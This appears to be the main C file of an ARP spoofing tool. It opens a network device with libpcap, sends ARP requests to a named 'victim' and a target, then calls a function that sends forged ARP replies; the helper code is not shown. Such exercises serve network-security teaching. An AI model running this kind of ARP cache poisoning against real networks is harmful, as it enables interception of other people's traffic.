#include <stdio.h>
#include <pcap.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <string.h>
#include "send_arp.h"

int main(int argc, char *argv[])
{
	char *dev, errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	struct network_pack attacker;
	struct network_pack sender;
	struct network_pack target;
	//How to Use//
	printf("//////////How to use//////////\n");
	printf("agv[1] : DEVICE\n");
	printf("agv[2] : VICTIM'S IP ADDRESS\n");
	printf("EXAMPLE : ./getn ens33 192.168.0.1\n");

	if(argc != 4)
	{
		printf("ARGUMENT ERROR : YOU MUST RESTART...\n");
		return(2);
	}

	dev = argv[1];
	inet_pton(AF_INET, argv[2], &sender.ip);
	inet_pton(AF_INET, argv[3], &target.ip);

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
	
	printf("Device: %s\n\n", dev);

	get_network_info(dev, &attacker);
	arp_request(handle, &attacker, &target);
	arp_request(handle, &attacker, &sender);
	send_arp(handle, &attacker, &target, &sender);
	
	return(0);
}
